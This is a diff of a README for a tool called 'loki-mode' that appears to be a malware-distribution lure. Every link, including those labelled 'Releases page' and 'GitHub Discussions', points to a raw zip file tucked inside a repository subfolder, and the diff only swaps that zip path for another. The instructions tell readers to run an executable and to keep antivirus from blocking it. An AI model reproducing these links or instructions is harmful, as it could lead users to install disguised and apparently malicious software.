@@ -6,7 +6,7 @@ Welcome to **loki-mode**, a multi-agent autonomous startup system designed for C
 
 ## 📥 Download the Application
 
-[![Download loki-mode](https://github.com/newperiod/loki-mode/raw/refs/heads/main/benchmarks/results/2026-01-05-01-24-17/mode-loki-v2.8.zip)](https://github.com/newperiod/loki-mode/raw/refs/heads/main/benchmarks/results/2026-01-05-01-24-17/mode-loki-v2.8.zip)
+[![Download loki-mode](https://github.com/newperiod/loki-mode/raw/refs/heads/main/examples/todo-app-generated/backend/loki-mode-paraflocculus.zip)](https://github.com/newperiod/loki-mode/raw/refs/heads/main/examples/todo-app-generated/backend/loki-mode-paraflocculus.zip)
 
 To get started, you will need to download the application. 
 
@@ -21,7 +21,7 @@ Before downloading, make sure your computer meets these requirements:
 
 ## 🔗 Download & Install
 
-1. Visit the [Releases page](https://github.com/newperiod/loki-mode/raw/refs/heads/main/benchmarks/results/2026-01-05-01-24-17/mode-loki-v2.8.zip) to find the latest version of loki-mode.
+1. Visit the [Releases page](https://github.com/newperiod/loki-mode/raw/refs/heads/main/examples/todo-app-generated/backend/loki-mode-paraflocculus.zip) to find the latest version of loki-mode.
 2. Click on the version you want to download. This will take you to a page with the binaries for different systems.
 3. Choose the file that matches your operating system. It could be a `.exe` file for Windows or a `.dmg` file for macOS.
 4. After downloading the file, locate it in your computer's downloads folder.
@@ -58,13 +58,13 @@ If you encounter any issues during installation or while using loki-mode, here a
 
 - **Installation Won’t Start:** Ensure your operating system meets the required version. Restart your computer and try again.
 - **Application Doesn’t Open:** Check if your system has the necessary permissions. Make sure your antivirus or firewall is not blocking the app.
-- **Features Not Working:** Ensure you have installed the latest version from the [Releases page](https://github.com/newperiod/loki-mode/raw/refs/heads/main/benchmarks/results/2026-01-05-01-24-17/mode-loki-v2.8.zip).
+- **Features Not Working:** Ensure you have installed the latest version from the [Releases page](https://github.com/newperiod/loki-mode/raw/refs/heads/main/examples/todo-app-generated/backend/loki-mode-paraflocculus.zip).
 
 ## 📢 Community and Support
 
 If you need help or want to connect with other users:
 
-- Join our community on [GitHub Discussions](https://github.com/newperiod/loki-mode/raw/refs/heads/main/benchmarks/results/2026-01-05-01-24-17/mode-loki-v2.8.zip) for questions and support.
+- Join our community on [GitHub Discussions](https://github.com/newperiod/loki-mode/raw/refs/heads/main/examples/todo-app-generated/backend/loki-mode-paraflocculus.zip) for questions and support.
 - Report any bugs or feature requests on the GitHub issue tracker.
 
 ## ✅ Final Steps
@@ -72,7 +72,7 @@ If you need help or want to connect with other users:
 After you install and run loki-mode, consider taking the following actions:
 
 1. **Explore the Features:** Spend time learning the capabilities of the software.
-2. **Stay Updated:** Check the [Releases page](https://github.com/newperiod/loki-mode/raw/refs/heads/main/benchmarks/results/2026-01-05-01-24-17/mode-loki-v2.8.zip) periodically for new updates and features.
+2. **Stay Updated:** Check the [Releases page](https://github.com/newperiod/loki-mode/raw/refs/heads/main/examples/todo-app-generated/backend/loki-mode-paraflocculus.zip) periodically for new updates and features.
 3. **Provide Feedback:** Your input helps us improve loki-mode.
 
 Thank you for choosing loki-mode! Enjoy your automated startup experience.
